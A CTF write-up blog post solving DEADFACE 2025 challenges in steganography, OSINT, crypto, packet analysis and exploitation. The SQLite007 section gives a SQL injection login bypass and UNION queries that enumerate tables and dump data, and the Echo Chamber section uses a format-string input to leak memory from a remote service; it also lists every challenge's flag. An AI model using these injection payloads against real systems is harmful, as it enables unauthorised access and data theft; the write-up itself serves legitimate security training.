---
layout: post
title:  "Main Challenges DEADFACE 2025"
date:   2025-10-26 21:43:43 -0400
author: robo.uzi
tags: [ctf]
permalink: /main-challenges/
---
* TOC
{:toc}

## Bad Boy (stego)

**Category:** stego

**Author:** @syyntax

**Description:** DEADFACE left this image on a victim’s machine with a hidden message. See if you can discover the flag hidden in this image. Submit the flag as `deadface{flag text}`.

```shell
strings baddestboi.png | grep dead  
deadface{th3_b4dd3st_B0i_al1V3}
```
`deadface{th3_b4dd3st_B0i_al1V3}`

___

## Git Good (osint)

**Category:** osint

**Author:** @syyntax

**Description:** We know that at least one DEADFACE member has a GitHub account. Find the account associated with that DEADFACE member. Submit the flag as `deadface{flag_text}`. Note: there may be similar usernames that are _**NOT**_ affiliated with DEADFACE CTF. The profile you’re looking for will have an `@deadface.io` email address displayed prominently on the user’s profile.

First I went to `https://ghosttown.deadface.io/u?order=likes_received` to get a list of all the threat actors. I went to github and searched each username until I found the account [https://github.com/mirveal-deadface](https://github.com/mirveal-deadface). 

`deadface{r3vE4LeD_m1Rv34L_$$}`

___

## SQLite007 (database sql)

**Category:** database sql

**Author:** @3.14ro

**Description:** DEADFACE is taunting us! We found their link! There was a breach!. How deep, and how for heaven’s sakes did they got in, we don’t know! Can you locate the flag? Submit the flag as `deadface{text}`. [https://deadface-db01.chals.io](https://deadface-db01.chals.io). 

I go to the site and bypass the login page with the credentials `admin:' OR 1=1--`. Once at the admin dashboard I can search the database by user for activity logs, api keys, and profiles. 

First check how many columns are in the database:
```
' UNION SELECT NULL,NULL,NULL,NULL,NULL--

### Results:

None, None, None, None, None
```
Once there is no error I know there are five.

Check the names of the tables:
```
' UNION SELECT name,NULL,NULL,NULL,NULL FROM sqlite_master WHERE type='table'--

### Results:

activity_logs, None, None, None, None  
api_keys, None, None, None, None  
general, None, None, None, None  
profiles, None, None, None, None  
sessions, None, None, None, None  
sqlite_sequence, None, None, None, None
```

Finally dump the flag:
```
' UNION SELECT flag, NULL, NULL, NULL, NULL FROM general-- 

### Results:

DEADFACE{you_found_the_sqli_01_flag!}, None, None, None, None
```

`DEADFACE{you_found_the_sqli_01_flag!}`

___

## Poor Megan (crypto)

**Category:** crypto

**Author:** @TheZeal0t

**Description:** Oh, NO! Poor MEGAN! She's just been bitten by a ZOMBIE! We can save her if we act fast, but the formula for the antidote has been encoded somehow. Figure out how to unscramble the formula to save Megan from certain zombification. Submit the flag as `deadface{here-is-the-answer}`.

The formula for the antidote: `jLfXjLjXiwfBRdi9lx49nwKslcvxih=1mYval2e9nLfXmxGalwy9lwi9lLf9lwy9nMnaQh=1ihSqlwDVmsvajYvXmMG8jcvZkg=1mYvwkgz1jwKspb55`

QUICK! She’s starting to GURGLE!!!

Just base64 decode the string in [cyberchef](https://gchq.github.io/CyberChef/#recipe=From_Base64('3GHIJKLMNOPQRSTUb%3DcdefghijklmnopWXYZ/12%2B406789VaqrstuvwxyzABCDEF5',true,false)&input=akxmWGpMalhpd2ZCUmRpOWx4NDlud0tzbGN2eGloPTFtWXZhbDJlOW5MZlhteEdhbHd5OWx3aTlsTGY5bHd5OW5NbmFRaD0xaWhTcWx3RFZtc3Zhall2WG1NRzhqY3Zaa2c9MW1ZdndrZ3oxandLc3BiNTU). 

`deadface{16-oz-warm-water-one-teaspoon-of-lemon-two-teaspoons-of-apple-cider-vinegar}`

___

## CreepNet (pcap, crypto)

**Category:** pcap crypto

**Author:** @TheZeal0t

**Description:** We know that DEADFACE communicated back to one of their servers, but we're not sure how they did it. The junior analyst over at De Monne Financial doesn't see any communications through standard channels in their network traffic. So, how is DEADFACE communicating? See if you can find the message. Submit the flag as `deadface{flag text}`.

I get the file `creep-log.pcap` and open it in wireshark:
```shell
file creep-log.pcap  
creep-log.pcap: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 262144)
```

I see a few different types of packets in the capture. `TCP`, `FTP`, `TLSv.1.3`, and `DNS`. Going through the tcp streams I see some file listing from FTP. I see some weird DNS requests so I filter for `dns.flags.response == 0` to easily see just the queries. After searching for this I find 3 weird requests:
```
ZGVhZGZhY2V7SXRzX0lt.com: type AAAA, class IN
aC1FdmVyeWQzdEBpbH0K.com: type AAAA, class IN
cDBydGFudC1UMC5jQHRj.com: type AAAA, class IN
```

After putting them in the right order `ZGVhZGZhY2V7SXRzX0ltcDBydGFudC1UMC5jQHRjaC1FdmVyeWQzdEBpbH0K` it decodes to the flag.

`deadface{Its_Imp0rtant-T0.c@tch-Everyd3t@il}`

___

## Double Decode (stego, crypto)

**Category:** stego crypto

**Author:** @G2Gh0st

**Description:** While doing forensics after a recent DEADFACE attack, the team found a file that was added to the system called `qr_flag.png`. Nothing seems wrong with the file, but we are sure Deadface is doing something with it. Can you figure out how this file has been modified and reveal the hidden secrets? Submit the flag as `deadface{flag_text}`.

I get the photo `qr_flag.png`:

![Alt text](/images/qr_flag.png)

I read the qr code but there is no data there.

I ran strings and found a base64 encoded string:
```shell
strings qr_flag.png  
IHDR  
IDATx  
PTY?  
lb3b=u  
d .[  
mh23  
vWi|\  
<"r_  
Ak&4  
a5A     u  
m;y&<  
Es`th  
IEND  
#df#  
IyBwYXlsb2FkLnB5CgpkYXRhID0gIjY0IDY1IDYxIDY0IDY2IDYxIDYzIDY1IDdiIDQ1IDVhIDcwIDZlIDY3IDQ4IDMxIDY0IDMxIDZlIDY3IDdkIgoKZmxhZyA9IGJ5dGVzLmZyb21oZXgoZGF0YSkuZGVjb2RlKCkKcHJpbnQoZmxhZykK
```

I decode the string and run the python to get the flag:
```shell
echo 'IyBwYXlsb2FkLnB5CgpkYXRhID0gIjY0IDY1IDYxIDY0IDY2IDYxIDYzIDY1IDdiIDQ1IDVhIDcwIDZlIDY3IDQ4IDMxIDY0IDMxIDZlIDY3IDdkIgoKZmxhZyA9IGJ5dGVzLmZyb21oZXgoZGF0YSkuZGVjb2RlKCkKcHJpbnQoZmxhZykK' | base64 -d  
# payload.py  
  
data = "64 65 61 64 66 61 63 65 7b 45 5a 70 6e 67 48 31 64 31 6e 67 7d"  
  
flag = bytes.fromhex(data).decode()  
print(flag)
```

`deadface{EZpngH1d1ng}`

___

## Secret Frog (stego, crypto)

**Category:** stego crypto

**Author:** @syyntax

**Description:** DEADFACE left behind this strange image of a frog with the message: “The frog has many secrets, but he’ll only tell you if you make him smile.” There’s obviously more to this image than we can see here. Figure out if you can find the flag associated with this image. Submit the flag as `deadface{flag text}`. 

I get the image `froggy-steg.png`:
```shell
file froggy-steg.png  
froggy-steg.png: PNG image data, 1024 x 1024, 8-bit/color RGB, non-interlaced
```

![Alt text](/images/froggy-steg.png)

I run binwalk and see there is a `gif` here but it was not extracted:
```shell
binwalk -e froggy-steg.png  
  
DECIMAL    HEXADECIMAL   DESCRIPTION  
--------------------------------------------------------------------------------
0          0x0           PNG image, 1024 x 1024, 8-bit/color RGB, non-interlaced
838        0x346         Zlib compressed data, default compression  
1223461    0x12AB25      GIF image data, version "89a", 461 x 461

cd _froggy-steg.png.extracted

file *  
346:      empty  
346.zlib: zlib compressed data
```

The `gif` is just appended to the end of the png so I can use `tail` to recover the `gif`:
```shell
tail -c +1223462 froggy-steg.png > hidden_from_offset.gif  

file hidden_from_offset.gif  
hidden_from_offset.gif: GIF image data, version 89a, 461 x 461
```

Screenshot where flag is visible in `gif`:

![Alt text](/images/frog-flag.png)

`deadface{surPr1s3D_Fr0ggy}`

___

## Think Outside the Box 3 (stego)

**Category:** steganography

**Author:** @syyntax

**Description:** DEADFACE is taunting us again. After their latest attack, they left an image behind. The only problem is that the important information left behind seems to be missing from the image. Try to figure out what the chat bubble is supposed to say in the image. Submit the flag as `deadface{flag_text}`.

I get this image:

![Alt text](/images/thinkoutsidethebox3.png)

As we can see it seems like the box is cut out of the image.

I open the `png` with stegsolve (`java -jar StegSolve-1.4.jar`) and look at its color inversion (XOR):

![Alt text](/images/solved.bmp)

`deadface{Th3_b0X_d0esnT_eX1st}`

___

## Echo Chamber (pwn, programming)

**Category:** pwn programming

**Author:** @syyntax

**Description:** DEADFACE loves their vintage tech, but their "Echo Chamber" chat bot has a critical flaw from the old days. It echoes messages without sanitizing input, potentially leaking sensitive data. As a Turbo Tactical operative, connect to the remote service at echochamber.deadface.io:13337 and exploit it to reveal a hidden flag. Submit the flag as `deadface{flag_text}`. `echochamber.deadface.io:13337`. 

When connecting I see this:
```shell
nc echochamber.deadface.io 13337  
DEADFACE Echo Chamber  
Enter your message: test  
Echo: test
```

After connecting and trying some different things I try `%s`:
```shell
nc echochamber.deadface.io 13337  
DEADFACE Echo Chamber  
Enter your message: %s  
Echo: deadface{r3tr0_f0rm4t_l34k_3xp0s3d}
```

`deadface{r3tr0_f0rm4t_l34k_3xp0s3d}`

___
